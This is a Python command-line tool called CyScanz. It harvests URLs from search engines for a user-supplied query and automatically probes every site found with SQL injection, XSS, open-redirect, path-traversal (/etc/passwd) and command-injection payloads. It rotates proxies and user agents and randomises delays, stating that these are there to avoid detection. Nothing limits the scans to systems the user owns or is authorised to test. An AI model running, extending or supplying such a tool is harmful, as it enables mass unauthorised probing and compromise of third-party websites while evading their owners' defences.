import asyncio
import random
import time
import urllib.parse
from typing import List, Dict, Optional, Set, Tuple
import httpx
from bs4 import BeautifulSoup
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.theme import Theme
from rich.text import Text
from rich.box import DOUBLE
import aiofiles
import re
from urllib.parse import urlparse

# ASCII Art banner
BANNER = """
 ██████╗██╗   ██╗███████╗ ██████╗ █████╗ ███╗   ██╗███████╗
██╔════╝╚██╗ ██╔╝██╔════╝██╔════╝██╔══██╗████╗  ██║╚══███╔╝
██║      ╚████╔╝ ███████╗██║     ███████║██╔██╗ ██║  ███╔╝ 
██║       ╚██╔╝  ╚════██║██║     ██╔══██║██║╚██╗██║ ███╔╝  
╚██████╗   ██║   ███████║╚██████╗██║  ██║██║ ╚████║███████╗
 ╚═════╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
                                                           
        [bold neon_pink]Advanced Web Vulnerability Scanner v1.0[/]
        [bold neon_green]By: Scav-engeR | Monsoon Squad[/]
"""

custom_theme = Theme(
    {
        "neon_green": "bold bright_green",
        "neon_pink": "bold magenta",
        "neon_purple": "bold medium_purple",
        "error": "bold red",
        "warning": "bold yellow",
        "success": "bold green",
        "info": "bold cyan",
    }
)
console = Console(theme=custom_theme)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
]

SEARCH_ENGINES = {
    "bing": "https://www.bing.com/search?q={query}&first={start}",
    "duckduckgo": "https://html.duckduckgo.com/html/?q={query}&s={start}",
    "google": "https://www.google.com/search?q={query}&start={start}",
    "yandex": "https://yandex.com/search/?text={query}&p={start}"
}

# Extended vulnerability test payloads
PAYLOADS = {
    "sqli": [
        "' OR '1'='1", 
        "1' OR '1'='1'--", 
        "' UNION SELECT 1,2,3--",
        "admin'--"
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ],
    "open_redirect": [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com"
    ],
    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/passwd"
    ],
    "rce": [
        ";id",
        "& ping -c 1 127.0.0.1",
        "| ls"
    ]
}

# Search result patterns for each engine
ENGINE_PATTERNS = {
    "bing": {"link_selector": "a[href^='http']", "attribute": "href"},
    "duckduckgo": {"link_selector": "a.result__url", "attribute": "href"},
    "google": {"link_selector": "a[href^='http']", "attribute": "href"},
    "yandex": {"link_selector": "a.Link", "attribute": "href"}
}

# Rate limiting delays (in seconds)
ENGINE_DELAYS = {
    "bing": 2.0,
    "duckduckgo": 1.0,
    "google": 3.0,
    "yandex": 2.5
}

class ProxyManager:
    """Manages a pool of proxies for rotating requests"""
    
    def __init__(self):
        self.proxies = []
        self.current_index = 0
    
    async def load_from_file(self, filepath: str) -> None:
        """Load proxies from a file"""
        try:
            async with aiofiles.open(filepath, 'r') as f:
                content = await f.read()
                self.proxies = [line.strip() for line in content.splitlines() if line.strip()]
                console.print(f"[info]Loaded {len(self.proxies)} proxies from {filepath}")
        except Exception as e:
            console.print(f"[error]Failed to load proxy file: {e}")
    
    def get_next(self) -> Optional[Dict[str, str]]:
        """Get the next proxy in the rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        
        if not proxy.startswith(('http://', 'https://')):
            proxy = f"http://{proxy}"
            
        return {"http://": proxy, "https://": proxy}

class Scanner:
    """Main scanner class that handles all operations"""
    
    def __init__(self):
        self.proxy_manager = ProxyManager()
        self.results = []
        self.urls_found = set()
        self.scan_depth = 1
        self.timeout = 15
        self.rate_limit = True
        self.proxy_fallback = True  # Enable proxy fallback by default
        self.failed_proxies = set()
    
    def get_headers(self) -> Dict[str, str]:
        """Get randomized headers for requests"""
        return {
            "Accept-Language": "en-US,en;q=0.9",
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Referer": "https://www.google.com/",
            "DNT": "1"
        }
    
    def is_valid_url(self, url: str) -> bool:
        """Validate URL format and allowed schemes"""
        try:
            parsed = urlparse(url)
            return all([parsed.scheme in ['http', 'https'], parsed.netloc])
        except:
            return False
    
    async def search_engine_scrape(self, query: str, count: int) -> List[str]:
        """Scrape search engines for URLs matching the query"""
        results = set()
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[neon_purple]Scanning search engines..."),
            BarColumn(),
            TextColumn("[neon_green]{task.description}"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            search_task = progress.add_task("", total=len(SEARCH_ENGINES))
            
            for engine_name, engine_url in SEARCH_ENGINES.items():
                progress.update(search_task, description=f"Processing {engine_name}")
                await self._scrape_engine(engine_name, engine_url, query, count, results)
                progress.advance(search_task)
                
        return list(results)
    
    async def _scrape_engine(self, engine_name: str, engine_url: str, query: str, count: int, results: Set[str]) -> None:
        """Scrape a specific search engine"""
        engine_pattern = ENGINE_PATTERNS.get(engine_name, {"link_selector": "a[href]", "attribute": "href"})
        
        # Calculate number of pages to fetch
        results_per_page = 10
        pages_to_fetch = min(5, (count + results_per_page - 1) // results_per_page)
        
        for page in range(pages_to_fetch):
            if self.rate_limit:
                # Add randomization to avoid detection
                delay = ENGINE_DELAYS.get(engine_name, 2) + random.uniform(0.5, 1.5)
                await asyncio.sleep(delay)
            
            start = page * 10
            url = engine_url.format(query=urllib.parse.quote_plus(query), start=start)
            
            # First try with proxy if available
            proxy = self.proxy_manager.get_next() if self.proxy_manager.proxies else None
            success = False
            
            # Try with proxy first (if available)
            if proxy and proxy.values():
                proxy_str = next(iter(proxy.values()))
                # Skip already failed proxies
                if proxy_str in self.failed_proxies:
                    continue
                    
                try:
                    async with httpx.AsyncClient(proxies=proxy, timeout=self.timeout, follow_redirects=True) as client:
                        headers = self.get_headers()
                        response = await client.get(url, headers=headers)
                        
                        if response.status_code == 200:
                            soup = BeautifulSoup(response.text, "html.parser")
                            links = soup.select(engine_pattern["link_selector"])
                            
                            if links:  # If we found links, consider this a success
                                success = True
                                for link in links:
                                    href = link.get(engine_pattern["attribute"])
                                    if href and self.is_valid_url(href):
                                        # Filter out search engine domains
                                        parsed_url = urlparse(href)
                                        if parsed_url.netloc and not any(se in parsed_url.netloc for se in ["google.", "bing.", "duckduckgo.", "yandex."]):
                                            results.add(href)
                        else:
                            console.print(f"[warning]Proxy returned non-200 response from {engine_name}: {response.status_code}")
                
                except Exception as e:
                    # Mark this proxy as failed
                    self.failed_proxies.add(proxy_str)
                    console.print(f"[warning]Proxy error with {engine_name}: {str(e)[:50]}")
            
            # Fallback to direct connection if proxy failed or isn't available
            if not success and self.proxy_fallback:
                try:
                    console.print(f"[info]Falling back to direct connection for {engine_name}")
                    async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
                        headers = self.get_headers()
                        # Use a slightly different User-Agent for fallback
                        headers["User-Agent"] = random.choice(USER_AGENTS)
                        response = await client.get(url, headers=headers)
                        
                        if response.status_code != 200:
                            console.print(f"[warning]Non-200 response from {engine_name}: {response.status_code}")
                            continue
                        
                        soup = BeautifulSoup(response.text, "html.parser")
                        links = soup.select(engine_pattern["link_selector"])
                        
                        for link in links:
                            href = link.get(engine_pattern["attribute"])
                            if href and self.is_valid_url(href):
                                # Filter out search engine domains
                                parsed_url = urlparse(href)
                                if parsed_url.netloc and not any(se in parsed_url.netloc for se in ["google.", "bing.", "duckduckgo.", "yandex."]):
                                    results.add(href)
                
                except Exception as e:
                    console.print(f"[error]Direct connection error with {engine_name}: {str(e)[:50]}")
            
            # Stop if we've collected enough
            if len(results) >= count:
                break
    
    async def scan_url(self, url: str) -> Dict:
        """Scan a URL for various vulnerabilities with proxy fallback"""
        results = {
            "url": url,
            "status": "ERROR",
            "response_time": 0,
            "server": None,
            "connection_type": "direct",  # Track if we used proxy or direct
            "vulnerabilities": {
                "sqli": False,
                "xss": False,
                "open_redirect": False,
                "lfi": False,
                "rce": False
            }
        }
        
        if not self.is_valid_url(url):
            results["status"] = "INVALID URL"
            return results
        
        # First try with proxy
        proxy_success = False
        proxy = self.proxy_manager.get_next() if self.proxy_manager.proxies else None
        
        if proxy and proxy.values():
            proxy_str = next(iter(proxy.values()))
            # Skip already failed proxies
            if proxy_str not in self.failed_proxies:
                try:
                    start_time = time.time()
                    async with httpx.AsyncClient(proxies=proxy, timeout=self.timeout, follow_redirects=True) as client:
                        headers = self.get_headers()
                        response = await client.get(url, headers=headers)
                        
                        end_time = time.time()
                        results["response_time"] = round(end_time - start_time, 2)
                        results["status"] = str(response.status_code)
                        results["server"] = response.headers.get("Server", "Unknown")
                        results["connection_type"] = "proxy"
                        
                        # Vulnerabilities check with proxy
                        await self._check_vulnerabilities(client, url, headers, results)
                        proxy_success = True
                        
                except (httpx.ConnectTimeout, httpx.ConnectError, httpx.ReadTimeout):
                    # Mark this proxy as failed
                    self.failed_proxies.add(proxy_str)
                    console.print(f"[warning]Proxy timeout or connection error for {url}")
                except Exception as e:
                    self.failed_proxies.add(proxy_str)
                    console.print(f"[warning]Proxy error scanning {url}: {str(e)[:50]}")
        
        # Fallback to direct connection if proxy failed or isn't available
        if not proxy_success and self.proxy_fallback:
            try:
                console.print(f"[info]Using direct connection for {url}")
                start_time = time.time()
                
                async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=True) as client:
                    headers = self.get_headers()
                    response = await client.get(url, headers=headers)
                    
                    end_time = time.time()
                    results["response_time"] = round(end_time - start_time, 2)
                    results["status"] = str(response.status_code)
                    results["server"] = response.headers.get("Server", "Unknown")
                    results["connection_type"] = "direct"
                    
                    # Vulnerabilities check with direct connection
                    await self._check_vulnerabilities(client, url, headers, results)
                    
            except httpx.ConnectTimeout:
                results["status"] = "TIMEOUT"
            except httpx.RequestError:
                results["status"] = "CONNECTION ERROR" 
            except Exception as e:
                results["status"] = f"ERROR: {str(e)[:30]}"
                
        return results
    
    async def _check_vulnerabilities(self, client, url, headers, results):
        """Separate method to check for vulnerabilities"""
        for vuln_type, payloads in PAYLOADS.items():
            for payload in payloads:
                # Different injection points based on vulnerability type
                if vuln_type in ["sqli", "xss"]:
                    # Try both GET and form parameters
                    parsed = urlparse(url)
                    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                    test_url = f"{base_url}?param={urllib.parse.quote_plus(payload)}"
                    
                    try:
                        r = await client.get(test_url, headers=headers, timeout=5)
                        
                        # Simple detection patterns
                        if vuln_type == "sqli" and any(pattern in r.text.lower() for pattern in ["sql syntax", "mysql error", "ora-", "syntax error"]):
                            results["vulnerabilities"]["sqli"] = True
                            break
                        elif vuln_type == "xss" and payload in r.text:
                            results["vulnerabilities"]["xss"] = True
                            break
                    except Exception:
                        continue
                        
                elif vuln_type == "open_redirect":
                    redirect_url = f"{url}?redirect={urllib.parse.quote_plus(payload)}"
                    try:
                        r = await client.get(redirect_url, headers=headers, follow_redirects=False, timeout=5)
                        if r.status_code in [301, 302, 303, 307, 308]:
                            location = r.headers.get("Location", "")
                            if "evil.com" in location:
                                results["vulnerabilities"]["open_redirect"] = True
                                break
                    except Exception:
                        continue
                        
                elif vuln_type == "lfi":
                    test_url = f"{url}?file={urllib.parse.quote_plus(payload)}"
                    try:
                        r = await client.get(test_url, headers=headers, timeout=5)
                        if "root:" in r.text and "bash" in r.text:
                            results["vulnerabilities"]["lfi"] = True
                            break
                    except Exception:
                        continue
                        
                elif vuln_type == "rce":
                    test_url = f"{url}?cmd={urllib.parse.quote_plus(payload)}"
                    try:
                        r = await client.get(test_url, headers=headers, timeout=5)
                        if any(pattern in r.text for pattern in ["uid=", "gid=", "PING", "Directory of"]):
                            results["vulnerabilities"]["rce"] = True
                            break
                    except Exception:
                        continue
    
    async def save_results(self, results: List[Dict], filepath: str) -> None:
        """Save scan results to file"""
        try:
            async with aiofiles.open(filepath, "w") as f:
                await f.write("URL\tStatus\tResponse Time\tServer\tConnection Type\tSQLi\tXSS\tRedirect\tLFI\tRCE\n")
                for r in results:
                    vulns = r.get("vulnerabilities", {})
                    line = f"{r['url']}\t{r['status']}\t{r['response_time']}s\t{r['server']}\t{r.get('connection_type', 'direct')}\t"
                    line += f"{vulns.get('sqli', False)}\t{vulns.get('xss', False)}\t"
                    line += f"{vulns.get('open_redirect', False)}\t{vulns.get('lfi', False)}\t{vulns.get('rce', False)}\n"
                    await f.write(line)
            
            # Generate stats
            proxy_count = sum(1 for r in results if r.get('connection_type') == 'proxy')
            direct_count = sum(1 for r in results if r.get('connection_type') == 'direct')
            failed_proxy_count = len(self.failed_proxies)
            
            console.print(f"[success]Results saved to {filepath}")
            console.print(f"[info]Connection stats: {proxy_count} via proxy, {direct_count} direct, {failed_proxy_count} failed proxies")
        except Exception as e:
            console.print(f"[error]Failed to save results: {e}")
    
    async def save_urls(self, urls: List[str], filepath: str) -> None:
        """Save URLs to file"""
        try:
            async with aiofiles.open(filepath, "w") as f:
                for url in urls:
                    await f.write(url + "\n")
            console.print(f"[success]URLs saved to {filepath}")
        except Exception as e:
            console.print(f"[error]Failed to save URLs: {e}")
    
    async def scan(self, query: str, count: int) -> Tuple[List[str], List[Dict]]:
        """Main scan function"""
        # First collect URLs
        console.print("[neon_purple]Starting search engine scraping...")
        urls = await self.search_engine_scrape(query, count)
        self.urls_found = set(urls)
        
        # Now scan each URL
        console.print("[neon_pink]Starting vulnerability scanning...")
        results = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[neon_purple]Scanning for vulnerabilities..."),
            BarColumn(),
            TextColumn("[neon_green]{task.percentage:.0f}%"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            scan_task = progress.add_task("Scanning...", total=len(urls))
            
            # Use batched scanning to avoid overwhelming connections
            batch_size = 5
            for i in range(0, len(urls), batch_size):
                batch = urls[i:i+batch_size]
                batch_results = await asyncio.gather(*[self.scan_url(url) for url in batch])
                results.extend(batch_results)
                progress.update(scan_task, advance=len(batch))
                
                # Add a small delay between batches
                await asyncio.sleep(0.5)
        
        return urls, results

async def main():
    console.print(Panel.fit(Text.from_markup(BANNER), box=DOUBLE))
    
    scanner = Scanner()
    
    # Configuration options
    query = Prompt.ask("[neon_green]Enter search query")
    count = IntPrompt.ask("[neon_green]Number of results to collect", default=50)
    
    # Advanced options
    if Confirm.ask("[neon_green]Show advanced options?", default=False):
        scanner.timeout = IntPrompt.ask("[neon_green]Request timeout (seconds)", default=15)
        scanner.rate_limit = Confirm.ask("[neon_green]Enable rate limiting?", default=True)
        scanner.scan_depth = IntPrompt.ask("[neon_green]Scan depth", default=1)
        
        proxy_file = Prompt.ask("[neon_green]Enter proxy file path (or leave blank)", default="")
        if proxy_file:
            await scanner.proxy_manager.load_from_file(proxy_file)
            
        # Add proxy fallback option
        scanner.proxy_fallback = Confirm.ask("[neon_green]Enable automatic fallback to direct connection if proxies fail?", default=True)
    
    console.print("[neon_purple]Initiating scan sequence...")
    
    urls, results = await scanner.scan(query, count)
    
    console.print(f"[neon_green]Found {len(urls)} URLs")
    
    if urls:
        output_file = Prompt.ask("[neon_green]Save raw URLs to which file?", default="output_urls.txt")
        await scanner.save_urls(urls, output_file)
    
    # Display vulnerability results
    table = Table(title="[neon_pink]Vulnerability Scan Results", box=DOUBLE, style="neon_purple")
    table.add_column("URL", style="neon_green", no_wrap=True)
    table.add_column("Status", justify="center")
    table.add_column("Time", justify="center")
    table.add_column("Conn", justify="center", style="info")
    table.add_column("SQLi", justify="center", style="neon_pink")
    table.add_column("XSS", justify="center", style="neon_pink")
    table.add_column("Redirect", justify="center", style="neon_pink")
    table.add_column("LFI", justify="center", style="neon_pink")
    table.add_column("RCE", justify="center", style="neon_pink")
    
    for r in results:
        vulns = r.get("vulnerabilities", {})
        
        # Connection type icon
        conn_type = r.get("connection_type", "direct")
        conn_icon = "[cyan]P[/cyan]" if conn_type == "proxy" else "[yellow]D[/yellow]"
        
        table.add_row(
            r["url"][:50] + "..." if len(r["url"]) > 50 else r["url"],
            r["status"],
            f"{r['response_time']}s",
            conn_icon,
            "[green]✔[/green]" if vulns.get("sqli", False) else "[red]✘[/red]",
            "[green]✔[/green]" if vulns.get("xss", False) else "[red]✘[/red]",
            "[green]✔[/green]" if vulns.get("open_redirect", False) else "[red]✘[/red]",
            "[green]✔[/green]" if vulns.get("lfi", False) else "[red]✘[/red]",
            "[green]✔[/green]" if vulns.get("rce", False) else "[red]✘[/red]"
        )
    
    console.print(table)
    
    vuln_output = Prompt.ask("[neon_green]Save scan results to which file?", default="vuln_results.txt")
    await scanner.save_results(results, vuln_output)
    
    console.print(Panel("[neon_purple]🎉 All done, runner of the net. Take care in the digital wilderness.", 
                        title="[neon_pink]Scan Complete", 
                        subtitle="[neon_green]CyScanz v1.0"))

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("[error]Scan terminated by user. Exiting safely.")
    except Exception as e:
        console.print(f"[error]Critical error: {e}")
